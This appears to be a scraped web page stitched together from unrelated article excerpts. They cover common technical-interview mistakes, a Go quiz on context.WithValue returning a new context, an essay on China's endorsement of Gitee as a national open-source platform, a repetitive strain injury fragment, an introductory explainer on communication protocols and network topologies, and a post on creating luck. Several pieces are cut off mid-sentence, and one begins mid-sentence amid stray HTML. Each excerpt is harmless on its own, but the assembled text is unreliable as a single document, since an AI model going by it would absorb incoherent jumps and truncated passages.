    <p>I do a fair amount of interviews, 60+ during the six months prior to COVID and during those I have noticed some common mistakes candidates make during the interview that are highly avoidable, so I thought I’d spend just a little bit of time writing those down and share them.</p>
<!-- raw HTML omitted -->
<h3 id="1---not-asking-clarification-questions">#1 - Not Asking Clarification Questions</h3>
<p>Normally all tech companies make candidates go through at least one round of technical interview, where a problem is presented and the candidate needs to address it and solve it. This interviews can vary in form, ie. coding challenges where the candidate needs to do hands-on coding, architectural interviews where the candidate would need to design some “bigger” system and so on and so forth.</p>
<p>Regardless of what type of technical question you may be asked, it is very important to ask clarifying questions <strong>always</strong>. And I can’t stress enought the <strong>always</strong> here, even if you think the problem given is trivial, it is not, take a bit of time to think about it and questions will pop up in your mind. For instance, if I asked you during an coding interview:</p>
<ul>
<li>“<em>given a list of numbers, return two numbers such that one times the other results in 220</em>”</li>
</ul>
<p>You could think that this two-sentence problem is very clear. However questions that I would ask are “<em>is the list sorted</em>…<em>are the numbers unique</em>…<em>can I multiply a number to itself</em>…<em>what shall I return if there are multiple numbers meeting the criteria</em>”.</p>
<p>Asking clarifying questions is however not only important for you to provide the best solution possible. It is also important because it is what I would expect you to do in real life when coming in to my team and you’re given a problem to solve. I would expect you to ask questions to further scope the problem, discover corner cases, etc. and not just go back to your desk and start coding.</p>
<p>I normally tell candidates upfront “<em>feel free to ask any question that helps you clarify</em>”. If you are given that cue, it is because it is important for the process. Stop, think, and ask the questions that will surely pop up.</p>
<h3 id="2---not-keeping-your-interviewer-engaged">#2 - Not keeping your interviewer engaged</h3>
<p>There was a time where I found this sentence just be BS. I thought that the interview process was just about me solving or answering questions. I was dead wrong. Any good interview process is a two-way street, a process where the interviewer and the candidate <strong>collaborate</strong> during however long the interview is. And because they are collaborating, it is very important to keep the other party engaged.</p>
<p>“<em>How do I keep my interviewer engaged?</em>” you may ask. It is extremely simple, just <strong>think out loud</strong>, let the interviewer know how and where your thoughts are taking you. I know this can feel odd, or you may fear saying anything stupid, don’t. There is literally nothing you may say that would be interpreted as stupid.</p>
<p>Thinking out loud during an problem solving interview has several advantages in my opinion:</p>
<ul>
<li>the obvious, you keep your interviewer engaged. We are all humans and it is very easy for us to let our mind wander off for a moment if the candidate is just silent while e.g. coding for 30 minutes. And as unfair as it might sound, an interviewer not paying attention, does not play on your side</li>
<li>the less obvious, it gives you more time. There are numerous instances where candidates that I interviewed just go silent during their coding or their architectural challenge and after a few minutes they just come with the solution. At that point I have lots of questions about the trade-offs they made, why they made them etc. Many of those questions could have been avoided by just walking me through that thought process, and that saves time that might be especially important when the solution is not completely correct.</li>
<li>the none obvious at all. <strong>Good interviewers are there to help you</strong>. Believe me, all good interviewers I know <strong>want the candidate to pass the interview</strong> and will do whatever possible (and within their limits) to help you succeed. So giving them early feedback on why/what/how you’re doing what you’re doing let them help you as soon as possible. For example, if I see that they path you’re taking will get you to a very bad solution, I will try to  ask subtle questions to make you to re-think about your current proposal and other possible trade-offs.</li>
</ul>
<h3 id="3---not-prepare-for-the-interview">#3 - Not prepare for the interview</h3>
<p>This mistake may seem very hard to make, right? Who comes to an interview for a tech company not having done tons of leetcode problems, studying algorithms and data structures to the limit?
Well, this is one side of the preparation, the other one however is not so obvious.</p>
<p>Most tech companies have rounds of behavioral interviews and although these may or may not involve certain technical (very high level) questions, you also need to prepare for these. These kinds of interviews are more like an open discussion where you will be asked things related to your previous projects, your background, certain situations you faced in the past and how you approached them, interactions with your team mates, how have you led projects (if applicable), etc. And for all these, it is better to come prepared.</p>
<p>When I say prepared, I don’t mean that you invent, or “fake” the answers to these types of questions, believe me when I tell you that it is relatively easy to know when any of that is true with just two-three follow up questions.
What I mean when I say prepare is that you should spend some time thinking about those kinds of past situations, for instance:</p>
<ul>
<li>that time you led that project that was slipping the deadline, how did you approach that? what did you do? what was the outcome? what did you learn?</li>
<li>that time you were given not so good feedback by some of your peers, think about what you learnt, how you felt, how you dealt with that and what changed moving forward</li>
<li>that time you had to give feedback to some of your peers that was hard for you to give, think about how you did it, would you do it in the same way today? how do you think it went now in retrospect?</li>
<li>that time you were given a problem that required more broader knowledge than what you had at that moment, what did you do? how did you deliver/ did you enjoy the challenge or was it stressful?</li>
<li>…</li>
</ul>
<p>I see this preparation as going back to your past memories and reflect on them. This will help during the interview as your thoughts will be already in order and you will not have to pause for minutes to think about what to say, you will just know what past experience is most relevant for that moment, believe me.</p>
<p>It is also very important to remember, be <strong>completely honest</strong>. In these kinds of interviews there is no right or wrong answer, we are just trying to get to know you a bit better, your motives and motivations, where you excel and where there is still potential improvement, etc. All this helps you and the hiring manager have a good start on your first day at work.</p>

	<p><small>August 29, 2020</small></p>
</div><div><p>Today, <a href="https://dave.cheney.net/">Dave Cheney</a> did another Go pop quiz
<a href="https://twitter.com/davecheney/status/1299846267850223616">on Twitter</a>,
where he asked whether the following code printed -6, 0, '&lt;nil&gt;', or
paniced:</p>

<blockquote><pre>package main
</pre>

<pre>import (
    "context"
    "fmt"
)

func f(ctx context.Context) {
    context.WithValue(ctx, "foo", -6)
}

func main() {
    ctx := context.TODO()
    f(ctx)
    fmt.Println(ctx.Value("foo"))
}
</pre>
</blockquote>

<p>I didn't answer this correctly because I focused my attention on the
wrong thing.</p>

<p>What I focused on was the use of the <code>"foo"</code> string as the context
key, partly because of my experience with languages like Python.
To start with, the <a href="https://golang.org/pkg/context/"><code>context</code></a>
package's documentation says:</p>

<blockquote><p>The provided key must be comparable and should not be of type string
or any other built-in type to avoid collisions between packages using
context. Users of WithValue should define their own types for keys.
[...]</p>
</blockquote>

<p>A traditional problem in languages like Python is that two strings
may compare the same without actually being the same thing, and
some code really wants you to present it with the exact same thing.
However, the <code>context</code> package doesn't require that you present it
with the exact same key, just a key where the <em>interface value</em> of
the key will compare the same.</p>

<p>(Because <code>context</code> compares interface values, both the value and
the type must match; it's not enough for both values to have the
same underlying concrete type, say string, and to compare identical.
This is why defining your own string type is a reliable away around
collisions between packages.)</p>

<p>So after I worked through all of this, I confidently answered that
this code printed -6. The <code>"foo"</code> string that the value is set
with is not necessarily the same <code>"foo"</code> string that it's retrieved
with, but that doesn't matter. However, this is not the problem
with the code. The actual problem is that <strong>context.WithValue()
returns a new context with the value set, it doesn't change the
context it's called on</strong>. Dave Cheney's code is written as if
<code>.WithValue()</code> mutates the current context, as <code>f()</code> ignores that
new context that <code>.WithValue()</code> provides and returns nothing to
<code>main()</code>. Since the original <code>context</code> in <code>main()</code> is what <code>.Value()</code>
is called on, it has no <code>"foo"</code> key and the result is actually
'&lt;nil&gt;'.</p>

<p>This problem with the code is actually a quite interesting mistake,
because as far as I can tell right now none of the usual Go style
checkers detect it. This code passes '<code>go vet</code>', it produces no
complaints from <a href="https://github.com/kisielk/errcheck"><code>errcheck</code></a>
because we're not ignoring an error return value, and tools like
<a href="https://github.com/golangci/golangci-lint">golangci-lint</a> only
complain about the use of the built-in type string as the key in
<code>.WithValue()</code>. Nothing seems to notice that we're ignoring the
critical return value from <code>.WithValue()</code>, which turns it into more
or less a no-op.</p>

<p>(Now that Dave Cheney has brought this to the surface, I suspect
that someone will contribute a check for it to <a href="https://staticcheck.io/">staticcheck</a>, which already detects the 'using a
built-in type as a key' issue.)</p>

                <div>
                    <p>The impending ban or acquisition of TikTok and ByteDance’s lawsuit against the Trump administration have sucked up all the oxygen in the US-China tech zeitgeist. A gigantic IPO, possibly the largest in the world, by Ant Financials is also looming on the horizon. Consequently, one story with potentially much farther-reaching impact got buried.</p><p>【想看<a href="https://interconnected.blog/can-you-nationalize-open-source/#chinese-version-below">中文的读者请点击这里</a>或滚动到本页下方】</p><p>That story is the Chinese <strong>Ministry of Industry and Information Technology (MIIT)’s anointment of Gitee, a homegrown Git-based developer collaboration platform</strong>, as the domestic “national champion” to drive open source growth in China. It got <a href="https://techcrunch.com/2020/08/21/china-is-building-its-github-alternative-gitee/">a blip on TechCrunch</a>, and I included the original announcement in <a href="https://interconnected.blog/august-23-2020-crypto-tiktok-jedi-zoom-pinduoduo-gitee/">last week’s Interconnected Weekly</a>. That's about it.</p><p>To understand why this development could have global significance, we need to first understand Gitee, MIIT’s role in China’s technology landscape, and open source’s own “gift culture” and global reach.</p><h2 id="what-is-gitee">What is Gitee?</h2><p>As readers of Interconnected know, I loathe the intellectually lazy comparisons that are common when talking about Chinese and American tech companies and try to avoid the “X is the [American company Y] of China” shorthand. Sure there has been plenty of cloning by Chinese companies of American success stories (and increasingly in the opposite direction), but both economies, cultures, and consumer behaviors are complex in their own ways and ought to be treated with nuance.</p><p>Sadly in Gitee’s case, this lazy framework happens to be rather accurate. It <em><strong>is</strong></em> the GitHub of China and nothing more.</p><h3 id="history-and-product">History and Product</h3><p>Gitee started in 2013 and was incubated out of OSChina, the country’s largest open source community website that started in 2008. OSChina owns Gitee, and even today the main contact email on Gitee’s homepage is a `oschina.cn` address. When Gitee started, GitHub (the current incumbent in the code repository hosting space) was a five-year-old Series A startup that was already gaining traction in various open source communities, especially the Ruby on Rails community.</p><figure><img src="https://lh3.googleusercontent.com/6N1XUrxagJ6la-tzFEoV_NaWdvhTZVBRTv92bZyQ0_xLMGDMsxAqib3n8rayNQfMkh-Sl1PeeOgEwMEXrPMXWxo4InjRT2BVhWCyzkFIQYOqh37G7j5Uk0__RiED17zGbHhzsuOc" alt=""></figure><figure><img src="https://lh6.googleusercontent.com/3Qspqh0GLw_AMq91OZ0QpGq7ctsslMPJuDpvakrvJ4XromE2sylsm7M63lOckfZUZbudrbAReRyDC9LwbIalEIacpWLzannK1mc_hwj1ax4WaYC7ffNJsST_gSkIlMBx9aOYvHfr" alt=""></figure><p>If GitHub didn’t revamp it’s own UI <a href="https://github.blog/changelog/2020-06-23-design-updates-to-repositories-and-github-ui/">just a couple of months ago</a>, the two platforms would’ve looked virtually identical, except for a different color scheme and one displaying many more Chinese characters than the other. (The degree of similarity reminds me a bit of RenRen and Facebook in the early days of social media in China.)</p><p>It’s not completely fair to say Gitee has done nothing new. It does have more social tools, like direct messaging, which GitHub does not support. It also has an embedded web-based IDE (Integrated Development Environment, aka text editor for developers) though it’s not clear how many developers use it in place of existing popular solutions, like VSCode or IntelliJ. GitHub continues to add new features at a rapid clip, even after the Microsoft acquisition, like GitHub Actions and <a href="https://github.blog/2020-05-06-new-from-satellite-2020-github-codespaces-github-discussions-securing-code-in-private-repositories-and-more/">Discussions (in beta)</a>, so it’ll take quite a few years before Gitee can reach feature parity, if ever.</p><p><em>(Before writing this post, I tried to sign up for a Gitee account to experience it fully as a developer, but got stumped by a bizarrely difficult captcha process that took me at least five tries without success. I didn’t know I was this bad at reading fuzzy letters. This level of friction and poor user experience would’ve made any developer balk and leave.)</em></p><figure><img src="https://lh5.googleusercontent.com/dyK5nkpTv83N7ExBAeILqTyjpv6mz0dXLOx2aPbl8lmoMTee1Ma6hUpGsof1ODJ5fCIGotLpokXWV0l4rbdqIVAMh_MetwhGVFzjkFRajv9i6QVFR__Xf3qvpXeGUmpVW8vDnbYl" alt=""></figure><h3 id="market-traction">Market Traction</h3><p>For the most part, Gitee is a typical venture-backed startup though it has not attracted much investment so far. In 2019, Gitee received a small strategic <a href="https://www.chinatechnews.com/2019/12/10/26287-oschina-gained-strategic-investment-from-baidu">investment from Baidu</a> and, in exchange, Baidu migrated some of its flagship open source projects, like its <a href="https://gitee.com/baidu/apolloauto">self-driving framework Apollo</a>, to Gitee to seed more adoption. It claims to be the 2nd largest code repository platform in the world. This claim is not that far-fetched considering that China-based developers’ activities on GitHub is the 2nd largest group by a wide margin. If you include Hong Kong-based developers with China, it may be the largest cohort, exceeding that of the United States. It’s likely that a solid proportion of Chinese developers have Gitee accounts, along with GitHub, which would justify Gitee’s 2nd place claim.</p><figure><img src="https://lh6.googleusercontent.com/-ynQ01jyNy-HDfVeglvZXazg4Jg5hbZmuaEJDjVDs18FrLpNTI-Hcx_gkcQFnPbT9uy5Rw1lGUFL3hZMZfW9D7YEzwo-89lwTjDxAtd9F1L81j5B6TftXKLB22I-9sQUMUbbzSoo" alt=""><figcaption>Source GitHub Octoverse 2019: https://octoverse.github.com/</figcaption></figure><p>From the business side, Gitee’s go-to-market approach is a classic enterprise strategy, which is, again, not that different from GitHub, GitLab, or other similar products. It counts Huawei, China Telecom, and a handful of banks as enterprise customers -- all companies with national strategic importance. With MIIT’s official endorsement, Gitee’s enterprise traction within China will grow. That also means it will have no traction outside of China, but doing business globally was never part of Gitee’s ambition, though that contradicts its claimed purpose to foster open source (more on that later).</p><p>When I was writing my 3-part series “<a href="https://interconnected.blog/open-source-in-china-the-players/"><strong>Open Source in China</strong></a>'' in May, I only briefly mentioned Gitee as one of the minor players in the ecosystem. MIIT’s anointment will boost Gitee’s profile and status, because it is now the designated “national champion”. There will be more government support for the platform. The company will get more investment from funds that like to align themselves closely with government initiatives. I can even see a day when Gitee will IPO on the Shanghai STAR exchange, similar to other much bigger “national champions”, like SMIC in the semiconductor industry.</p><p>There are still lots of unknowns to how Gitee will grow as a product. What is clear is that Gitee is <strong>now a “policy-driven” company </strong>that will rely heavily on the government direction-setting and protectionism, quite similar to its investor Baidu. While all current Chinese tech giants have benefited from some level of protectionism in the past, Alibaba, Tencent, Huawei, and now ByteDance have all grown their core technologies and products to a level where they <em>can</em> compete with other global players on those terms alone. Not Baidu. And not Gitee.</p><h2 id="miit-s-role">MIIT’s Role</h2><p>MIIT is the most relevant central government ministry to pay attention to when it comes to China’s technology sector. It has embraced open source in an official policy planning document in 2016, titled: “2016-2020: Development Planning of Software and Information Technology Services Industry” (unofficial translation). This document laid out a few initiatives (more like proclamations) where open source was the centerpiece:</p><blockquote>“...promote the effect that the open source community has to support innovation, strengthen the real-world application of open source technology in innovation, build an open source ecosystem that is advantageous to innovation in an open, collaborative, and global fashion...” (unofficial translation)</blockquote><p>The endorsement of Gitee is the result of an official government project procurement in May that called for proposals of solutions for an “open source hosting platform”. <strong>This is perhaps the first step that MIIT took to concretely involve itself in open source.</strong></p><figure><img src="https://lh3.googleusercontent.com/A1Uco6q0-KGLps5UveY5NjqQwZWAKg73Y_oDF-P5VQslEbAhISsdTrv7VIZnA3kfj17ThFiCvSTT84R5L1UZWSYzr9dzNbGk3PCIEbxwvwWx5NaL5JCFQCZifoZnur8WjF049Q-H" alt=""><figcaption>MIIT official project procurement announcement</figcaption></figure><p>In the end, the group that won the project was a consortium of 10 organizations that included: Huawei, a few technical universities and think tanks, a few other companies, and, of course, OSChina. Thus Gitee.</p><p><strong>Why did Gitee win? It’s really the only game in town.</strong> I highly doubt GitHub or GitLab submitted a proposal.</p><p>If MIIT was simply interested in embracing open source and lending its support to Chinese open source developers where they are working and collaborating now, GitHub would’ve been the obvious choice. On Zhihu, a Quora-like service in China where many developers congregate to discuss technology topics (thus a good proxy for assessing interest level), <strong>more than 84,000 people follow GitHub. Gitee? 243</strong> (at the time of this writing).</p><figure><img src="https://lh6.googleusercontent.com/QVwEbCc5rDm81FVyJuqIqRlycRfAzwSzi2nJcz5lJiZTPNfHxkU4Hy_1AH7aERIVM5RHtVaLql7GRdKen0rle5HjDiZxeiPVY4XUIrAoZ8AHm0bmfU5HvgiR8WIJRAg-Fy4uEXCU" alt=""></figure><figure><img src="https://lh4.googleusercontent.com/BEgC9nm1LSdYZp0EiUgkBsC6wyXjl31tQx-00O45iojWB2UCEe3Sb7eehtF4c5k1UFe7m5UWbPHEFlpuR9eslPp0RlQMQOzQQjoWIvwjGgScjaG0XaJFDhFoHoHsXOyIlhPhaHI8" alt=""></figure><h3 id="how-will-all-this-play-out">How will all this play out?</h3><p>There are not enough details to speculate. As the current four-year planning period ended in 2020, MIIT is likely working on the next four years of planning, where Gitee will play a significant role.</p><p>However, it is likely that any open source project that MIIT or its various sub-bureaus will use in the future will have to be hosted on Gitee. If the project is already on GitHub, the company or team that runs the project will probably have to maintain another copy on Gitee. This requirement may extend to many of the strategic tech sectors that are under MIIT’s jurisdiction.</p><p>All this is done to exert some level of national “control” on the open source technologies that are important to China’s path towards self-reliance, just in case GitHub becomes inaccessible due to more sanctions or policy changes from Washington.</p><p><strong>This fear is not unwarranted. </strong>Right now, GitHub is accessible albeit with performance issues here and there, but no one can guarantee that will continue in this current environment between the US and China. Being a subsidiary of Microsoft, GitHub may also be caught up in the potential Microsoft-TikTok deal in ways that no one can predict.</p><p>There’s a lot to untangle, and the future is murky. Thus, some contingency planning is quite reasonable.</p><p>But is this attempt to “nationalize” open source in China going to work?</p><h2 id="open-source-can-t-be-nationalized-">Open Source Can’t Be “Nationalized”</h2><p>As you might’ve guessed by now, the title of the post is a rhetorical question. You can’t “nationalize” open source.</p><p>But the bigger point is: <strong>it’s dangerous to think you can.</strong></p><p>It’s smart for a government to embrace the innovative energy of open source to boost its own technological advancement. China is doing it. I’ve advocated <a href="https://www.wired.com/story/opinon-the-future-of-american-industry-depends-on-open-source-tech/"><strong>in this Wired opinion piece</strong></a><strong> </strong>that the U.S. should be doing the same.</p><p>But no government can or should try to “nationalize” open source, because it contradicts the very nature and culture of open source that made it the technological force that it is today.</p><p><strong>Eric Raymond</strong>, one of the founding members of the free software and open source movement, wrote a profound essay called “<a href="http://www.catb.org/~esr/writings/cathedral-bazaar/homesteading/ar01s06.html"><strong>The Hacker Milieu as Gift Culture</strong></a>” in the 90s. In it, he explained that <strong>the open source hacker culture is …</strong></p></div></section></article></div></div></div>

It includes a whole spectrum of conditions, from tendonitis of the hand or wrist to carpal tunnel syndrome to cubital tunnel syndrome. Basically, if your hands or wrists hurt or go numb or tingle, that may be RSI. If these symptoms are associated with repetitive tasks, such as typing at a computer, it is almost certainly RSI. (Note that such symptoms do sometimes go away within a few minutes, hours, days, or weeks.) Other symptoms include losing strength or coordination in your hands, or perhaps dropping things.</p> <p>Not everyone experiences all symptoms, and sometimes your symptoms may not occur until several hours or even days after the activity which causes them. (Have you ever hiked a long way and not been really sore until the next day or even two days later?) Some people, especially at UHS, call RSIs Cumulative Trauma Disorders (CTDs); it's the same thing.</p> </blockquote> <ul> <li>RSI seems to have many causes. Everyone's RSI is different.

Preface
</summary>

  <p>I wrote this article to introduce the Internet to a non-technical audience.
In order to get everyone on board,
I first explain basic concepts, such as
<a href="#communication-protocol">communication protocols</a>,
<a href="#network-topologies">network topologies</a>,
and <a href="#signal-routing">signal routing</a>.
The section about <a href="#internet-layers">Internet layers</a> becomes increasingly technical
and peaks with a deep dive into <a href="#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>.
If the beginning is too elementary for you,
then just skip ahead to more interesting sections.</p>

  <p>Due to the nature of the topic,
this article contains a lot of acronyms.
Many of them are <a href="https://en.wikipedia.org/wiki/Three-letter_acronym">three-letter acronyms (<abbr title="Three-Letter Acronym">TLA</abbr>)</a>,
but some are longer,
which makes them extended three-letter acronyms (<abbr title="Extended Three-Letter Acronym">ETLA</abbr>).
While I introduce most of the acronyms before using them,
you can simply hover over a <abbr title="Three-Letter Acronym">TLA</abbr> or an <abbr title="Extended Three-Letter Acronym">ETLA</abbr> with your mouse
if you forgot what they stand for.
If you are reading this on a touch device,
you have to touch the acronym instead.</p>

  <p>Let’s get right into it:
What is a protocol?</p>

</details>

<h2 id="communication-protocol">Communication protocol</h2>

<h3 id="communication-diagram">Communication diagram</h3>

<p>A <a href="https://en.wikipedia.org/wiki/Communication_protocol">communication protocol</a>
specifies how two parties can exchange information for a specific purpose.
In particular, it determines which messages are to be transmitted in what order.
If the two parties are computers,
a formal, well-defined protocol is easiest to implement.
In order to illustrate what is going on, however,
let’s first look at an informal protocol,
also known as <a href="https://en.wikipedia.org/wiki/Etiquette">etiquette</a>,
which we’re all too familiar with:</p>

</figcaption>
</figure>

<p>This is a <a href="https://en.wikipedia.org/wiki/Sequence_diagram">sequence diagram</a>
and it highlights the temporal dimension of a protocol
in which messages are exchanged sequentially.</p>

<h3 id="communication-parties">Communication parties</h3>

<p>It also illustrates that communication is commonly initiated by one party,
whereby the recipient responds to the requests of the initiator.
Please note that this is only the case for one-to-one protocols,
in which each message is intended for a single recipient.</p>

<details>
  <summary id="broadcasting-and-information-security">
Broadcasting and information security
</summary>

  <p>There are also one-to-many protocols for <a href="https://en.wikipedia.org/wiki/Broadcasting">broadcasting</a>.
These are typically one-way protocols,
in which the recipients do not acknowledge the receipt of the transferred data.
Examples for such protocols are analog radio
or churches ringing their bells to indicate the time of day.
Both in the case of a single recipient and in the case of a broad target audience,
anyone with access to the physical medium and the right sensors receives the signal.
The difference is simply that,
in the former case,
entities ignore the messages
which are not addressed to them.
If the messages are not encrypted,
others can still read them, though.
And if the messages are not authenticated,
a malicious party might be able to alter them in transit.
Even when messages are encrypted and authenticated,
their exchange can still be interrupted,
by not relaying some messages
or by <a href="https://en.wikipedia.org/wiki/Radio_jamming">jamming</a> the signal.
The properties Confidentiality, Integrity, and Availability
form the so-called <abbr title="Confidentiality, Integrity, and Availability">CIA</abbr> triad of <a href="https://en.wikipedia.org/wiki/Information_security">information security</a>.</p>

</details>

<h3 id="communication-channel">Communication channel</h3>

<p>The above greeting protocol is used among humans
to establish a <a href="https://en.wikipedia.org/wiki/Communication_channel">communication channel</a> for a longer exchange.
In technical jargon,
such an exchange in preparation for the actual communication is called a <a href="https://en.wikipedia.org/wiki/Handshaking">handshake</a>.
The greeting protocol checks the recipient’s availability and willingness to engage in a conversation.
When talking to someone you have never spoken before,
it also ensures that the recipient understands your language.
I’ve chosen these two examples for their figurative value.
Why we actually <a href="https://en.wikipedia.org/wiki/Greeting">greet</a> each other
is mainly for different reasons:
To show our good intentions by making our presence known to each other,
to signal sympathy and courtesy by asking the superficial question,
and to indicate our relative social status to each other and to bystanders.
Another benefit of asking such a question is that,
even though it’s very shallow,
it makes the responder more likely to do you a favor
due to the psychological effect of
<a href="https://www.influenceatwork.com/principles-of-persuasion/#consistency">commitment and consistency</a>.</p>

<h2 id="handling-of-anomalies">Handling of anomalies</h2>

<h3 id="protocol-deviation">Protocol deviation</h3>

<p>Since your communication partner can be erratic,
a protocol needs to be able to handle deviations:</p>

<p>In order to detect transmission errors,
computers typically append a <a href="https://en.wikipedia.org/wiki/Checksum">checksum</a> to each message,
which the recipient then verifies.
The need to <a href="https://en.wikipedia.org/wiki/Retransmission_(data_networks)">retransmit</a> messages
can be reduced by adding redundancy to messages
so that the recipient can <a href="https://en.wikipedia.org/wiki/Error_detection_and_correction">detect and correct small errors</a> on their own.
A simple and very inefficient way of doing this is to repeat the content within each message several times.</p>

<h3 id="connection-loss">Connection loss</h3>

<p>It can also happen that a party loses their connection permanently,
for example by moving too far away for the signal to reach the recipient.
Since a conversation requires some attention from the communication partner,
abandoning a conversation unilaterally without notifying the other party
can be misused to block them from talking to someone else for some time.
In order to avoid binding resources for a prolonged period of time
and thereby potentially falling victim to a so-called
<a href="https://en.wikipedia.org/wiki/Denial-of-service_attack">denial-of-service attack</a>,
computers drop connections after a configurable duration of inactivity:</p>

  <figcaption>
Bob’s second message (in blue) arrives after his third message (in green).
</figcaption>
</figure>

<p>The solution for this is to enumerate all messages,
to reorder them on arrival,
and to ask the other party to retransmit any missing messages,
as we saw <a href="#data-corruption">above</a>.</p>

<h3 id="lack-of-interoperability">Lack of interoperability</h3>

<p>Besides defining the <a href="https://en.wikipedia.org/wiki/Syntax">syntax</a> (the format),
the <a href="https://en.wikipedia.org/wiki/Semantics">semantics</a> (the meaning),
and the order of the messages,
a protocol should also specify how to handle anomalies like the above.
Ambiguity in a standard
and willful deviation therefrom
result in incompatibilities between different implementations.
In combination with a lack of established standards in many areas,
which often leads to uncoordinated efforts by various parties,
incompatibilities are quite common in computer systems,
unfortunately.
This causes a lot of frustration for users and programmers,
who have to find workarounds for the encountered limitations,
but this cannot be avoided in a free market of ideas and products.</p>

<h2 id="network-topologies">Network topologies</h2>

<h3 id="communication-network">Communication network</h3>

<p>In practice, there are almost always more than two parties
who want to communicate with each other.
Together with the connections between them,
they form a <a href="https://en.wikipedia.org/wiki/Telecommunications_network">communication network</a>.
For the scope of this article,
we’re only interested in symmetric networks,
where everyone who can receive can also send.
This is not the case for analog radio and television networks,
where signals are broadcasted unidirectionally from the sender to the receivers.
In the case of our symmetric networks,
two entities are part of the same network
if they can communicate with each other.
If they cannot reach each other,
they belong to separate networks.</p>

<h3 id="nodes-and-links">Nodes and links</h3>

<p><a href="https://en.wikipedia.org/wiki/Node_(networking)">Nodes</a> are the entities
that communicate with each other over communication <a href="https://en.wikipedia.org/wiki/Data_link">links</a>.
We can visualize this as follows:</p>

</figure>

<p>The terminology is borrowed from <a href="https://en.wikipedia.org/wiki/Graph_theory">graph theory</a>,
where nodes are also called vertices
and links are also called edges.
The technical term for the structure of a network is <a href="https://en.wikipedia.org/wiki/Network_topology">topology</a>.
Different arrangements of nodes and links lead to different characteristics of the resulting network.</p>

<h3 id="fully-connected-network">Fully connected network</h3>

<p>A network is said to be fully connected
if every node has a direct link to every other node:</p>

A fully connected network with five nodes and ten links.
</figcaption>
</figure>

<p>In graph theory, such a layout is known as a <a href="https://en.wikipedia.org/wiki/Complete_graph">complete graph</a>.
Fully connected networks scale badly
as the number of links grows quadratically with the number of nodes.
You might have encountered the formula for the number of links before:
n × (n – 1) / 2, with n being the number of nodes in the network.
As a consequence, this topology is impractical for larger networks.</p>

<h3 id="star-network">Star network</h3>

<p>The number of links can be reduced considerably by introducing a central node,
which forwards the communication between the other nodes.
In such a star-shaped network,
the number of links scales linearly with the number of nodes.
In other words,
if you double the number of nodes,
you also double the number of links.
In a fully connected network, you would have quadrupled the number …</p></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="sapper"> <div>  <main> <div>  <p>My entire worldview changed when I realized that <strong>luck can be created</strong>.</p> <p>More precisely, you can actively <strong>create optimal conditions for lucky things to happen to you</strong>. The more I looked into this, the more I realized that this is not only <em>not</em> a new insight, but successful people have studied this for <em>decades</em> and I am just late to the party.</p> <p>In this post we'll briefly review the "Literature of Luck", and then I'll end with some personal thoughts on how it could be extended.</p> <section> <h2 id="binary-luck">Binary Luck</h2> <p>Most people have a binary view of luck:</p> <p> <img alt="Alt Text" src="https://dev-to-uploads.s3.amazonaws.com/i/kgd335km9x3ujfmhxnz7.png"> </p> <p>This is true enough. Some people are born into privilege, some people just win some literal or figurative lottery or other.</p> <p>The closing question of every episode of Guy Raz's <a href="https://www.npr.org/podcasts/510313/how-i-built-this">How I Built This</a> podcast asks successful people: <em>"How much of your success is due to skill, and how much is due to luck?"</em></p> <p>Those who believe in their own agency answer the former. Others - who've seen people smarter and harder working than them fail - answer the latter. Those who are politically correct cop-out with the half-and-half.</p> <p>It can be comforting to subscribe to the binary luck model. If you just got a bad roll of the dice, there's nothing you could do. Your lack of success is not your fault.</p> <p>But what if I told you <strong>there are people who have skill at creating luck</strong> for themselves?</p> </section> <section> <h2 id="luck-surface-area">Luck Surface Area</h2> <p>Jason Roberts coined the term "<a href="https://www.codusoperandi.com/posts/increasing-your-luck-surface-area">Luck Surface Area</a>", and it was expanded by <a href="https://www.skmurphy.com/blog/2019/04/03/increase-your-luck-surface-area-to-get-more-customers/">Sean Murphy</a> and popularized by <a href="https://www.perell.com/podcast/patrick-mckenzie-internet-famous">Patrick McKenzie</a>.</p> <p>I liken this model of luckiness to a "catchment area" (<a href="https://en.wikipedia.org/wiki/Catchment_area">a term from urban and hydrological geography</a>). Luck is still randomly occurring, but you can position yourself in a way that captures more of it:</p> <p> <img alt="Alt Text" src="https://dev-to-uploads.s3.amazonaws.com/i/ogbkk8weenqb9nltrl34.png"> </p> <p>Jason has a really simple model of how to grow your LSA - do more things, and tell more people about it. <strong>Doing and Telling</strong>. Already this embodies a more active attitude toward how you can orient your life for more positive random events. It's "<a href="https://www.brainpickings.org/2014/01/29/carol-dweck-mindset/">Fixed vs Growth mindset</a>" adapted for luck.</p> </section> <section> <h2 id="four-kinds-of-luck">Four Kinds of Luck</h2> <p>A parallel, older school of thought dates back to James Austin in 1978 and was repopularized by <a href="https://pmarchive.com/luck_and_the_entrepreneur.html">Marc Andreesen</a> in 2007, then <a href="https://twitter.com/nivi/status/1094940675353784320?lang=en">Naval and Nivi</a> a decade later.</p> <p>Here, there are no helpful visuals. James Austin just gives a list of types, and Marc quotes verbatim. <a href="https://twitter.com/naval/status/1093981014920052736">Naval summarizes</a> the 4 kinds of luck as such:</p> <blockquote> <ol> <li> <p>Hope luck finds you.</p> </li> <li> <p>Hustle until you stumble into it.</p> </li> <li> <p>Prepare the mind and be sensitive to chances others miss.</p> </li> <li> <p>Become the best at what you do. Refine what you do until this is true. Opportunity will seek you out. Luck becomes your destiny.</p> </li> </ol> </blockquote> <p>I've quoted this many times to friends and always had trouble remembering what the 4 types are. I gave it some thought and visualized/organized it as such:</p> <p> <img alt="Alt Text" src="https://dev-to-uploads.s3.amazonaws.com/i/5ycsicfgoxsvxoyys5ip.png"> </p> <ol> <li> <p><strong>🌱 Accidental Luck</strong>: You have the same luck as a plant. A plant does not move. Whether or not a plant does well pretty much just depends on where it's seed lands. It's not very interesting since by definition you can't do anything about it, but ofc privilege plays a huge part.</p> </li> <li> <p><strong>🏃🏽‍♀️ Active Luck</strong>: The luck you get from constantly moving around. There's no particular direction in mind, but you're more likely to find something good if you move around and explore instead of stay put and hope. You're more likely to roll a 6 if you roll more dice.</p> <blockquote> <p><a href="https://due.com/blog/keep-going-charles-f-kettering/">"I have never heard of anyone stumbling on something sitting down." - Charles Kettering</a></p> </blockquote> </li> <li> <p><strong>💊 Prepared Luck</strong>: The luck you get from noticing that something lucky has happened, that most would miss. The canonical story on this is Alexander Fleming's discovery of penicillin, which was a huge medical breakthrough. The discovery was a total accident, but Fleming was not only "uniquely equipped to observe it" by his background, he took action to confirm the hypothesis.</p> <blockquote> <p>"Chance favors the prepared mind." - Louis Pasteur</p> 